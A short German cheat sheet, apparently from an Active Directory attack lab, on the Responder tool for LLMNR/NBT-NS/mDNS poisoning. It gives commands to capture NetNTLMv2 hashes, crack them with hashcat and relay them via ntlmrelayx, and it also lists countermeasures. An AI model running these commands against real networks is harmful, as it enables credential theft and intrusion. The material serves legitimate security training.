# Responder

**Kategorie:** AD – LLMNR/NBT-NS/mDNS-Poisoning

Antwortet auf **LLMNR/NBT-NS/mDNS**-Broadcast-Anfragen gefälscht („ich bin der gesuchte Host") → der anfragende Windows-Client authentifiziert sich beim Angreifer und liefert seinen **NetNTLMv2-Hash** (offline crackbar, Mode 5600). Bringt eigene Fake-Dienste (SMB/HTTP/…) mit.

```bash
sudo responder -I eth0 -wv
```

## Wichtigste Optionen

| Option | Bedeutung |
|--------|-----------|
| `-I <iface>` | Interface im Zielsegment |
| `-w` | WPAD-Rogue-Server |
| `-v` | verbose |
| `-A` | Analyse-Modus (nur mithören, nicht antworten) |

## Ablauf

```bash
sudo responder -I eth0 -wv
# Client sucht nicht auflösbaren Namen -> Hash erscheint:
#   [SMB] NTLMv2-SSP Hash : jdoe::LAB:...
# Logs: /usr/share/responder/logs/
hashcat -m 5600 hash.txt rockyou.txt
```

## Mit ntlmrelayx kombinieren

Für **Relay** (statt Cracking) in `/etc/responder/Responder.conf` **SMB=Off, HTTP=Off** setzen, damit `ntlmrelayx.py` die Authentifizierung übernimmt.

## Hinweis

`-A` (Analyse) zum unauffälligen Erkunden. Nur eigenes Lab-Segment. Gegenmaßnahme: **LLMNR/NBT-NS deaktivieren** (GPO), SMB-Signing.

## Verwendet in

active-directory-attacks 07 (LLMNR/Relay), 10.
